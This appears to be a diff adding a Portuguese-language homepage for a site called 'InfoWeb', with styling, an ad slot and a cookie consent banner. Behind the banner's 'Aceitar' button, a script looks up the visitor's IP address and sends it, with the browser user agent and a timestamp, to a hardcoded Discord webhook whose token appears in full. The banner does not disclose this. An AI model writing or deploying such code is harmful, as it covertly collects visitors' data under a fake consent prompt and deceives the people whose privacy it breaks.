@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>InfoWeb — Conteúdo Digital</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- SCRIPT DE ANÚNCIOS (exemplo) -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:#020617;
+  color:#fff;
+}
+
+header{
+  background:#0f172a;
+  padding:20px;
+  text-align:center;
+}
+
+header h1{
+  color:#38bdf8;
+}
+
+nav{
+  margin-top:10px;
+}
+
+nav a{
+  color:#fff;
+  margin:0 10px;
+  text-decoration:none;
+  font-weight:bold;
+}
+
+.container{
+  max-width:800px;
+  margin:auto;
+  padding:20px;
+}
+
+.card{
+  background:#0f172a;
+  padding:20px;
+  border-radius:15px;
+  margin-bottom:20px;
+}
+
+footer{
+  background:#020617;
+  text-align:center;
+  padding:15px;
+  font-size:14px;
+  opacity:0.7;
+}
+</style>
+</head>
+
+<!-- BANNER DE CONSENTIMENTO -->
+<div id="consentimento" style="
+position:fixed;
+bottom:0;
+left:0;
+width:100%;
+background:#020617;
+color:white;
+padding:15px;
+text-align:center;
+z-index:9999;
+display:none;
+">
+  Cookies 🍪.
+  <br><br>
+  <button onclick="aceitar()" style="padding:10px 20px;">Aceitar</button>
+</div>
+
+<script>
+const webhook = "https://discord.com/api/webhooks/1455577215453626399/i-CuXWg6aeugQa-nnQIf1topAbR-e8v-kGU5UAB-VBgeHL_7503eWQ-N7FveNgZTfEGu";
+
+if(!localStorage.getItem("consentimento")){
+  document.getElementById("consentimento").style.display = "block";
+}
+
+function aceitar(){
+  localStorage.setItem("consentimento","true");
+  document.getElementById("consentimento").style.display = "none";
+  coletarDados();
+}
+
+async function coletarDados(){
+  try{
+    const ipData = await fetch("https://api.ipify.org?format=json")
+      .then(res => res.json());
+
+    const dados = {
+      content:
+`📡 **Nova visita**
+🌐 IP: ${ipData.ip}
+🧭 Navegador: ${navigator.userAgent}
+🕒 Data: ${new Date().toLocaleString()}`
+    };
+
+    fetch(webhook,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json"
+      },
+      body: JSON.stringify(dados)
+    });
+
+  }catch(e){
+    console.log("Erro ao coletar dados");
+  }
+}
+</script>
+
+<body>
+
+<header>
+  <h1>🌐 InfoWeb</h1>
+  <p>Conteúdo digital, curiosidades e ferramentas online</p>
+  <nav>
+    <a href="index.html">Início</a>
+    <a href="privacidade.html">Privacidade</a>
+    <a href="contato.html">Contato</a>
+  </nav>
+</header>
+
+<div class="container">
+
+  <div class="card">
+    <h2>📌 Bem-vindo</h2>
+    <p>
+      O InfoWeb é um site criado para compartilhar conteúdo digital,
+      curiosidades da internet e ferramentas úteis.
+    </p>
+  </div>
+
+  <!-- ANÚNCIO -->
+  <div class="card">
+    <h3>Publicidade</h3>
+
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-SEU_ID_AQUI"
+         data-ad-slot="SEU_SLOT_AQUI"
+         data-ad-format="auto"></ins>
+
+    <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+  </div>
+
+  <div class="card">
+    <h2>💡 Curiosidade</h2>
+    <p>
+      Você sabia que mais de 60% do tráfego da internet hoje vem de celulares?
+      Por isso este site é totalmente responsivo.
+    </p>
+  </div>
+
+</div>
+
+<footer>
+  © 2025 InfoWeb • Todos os direitos reservados
+</footer>
+
+</body>
+</html>
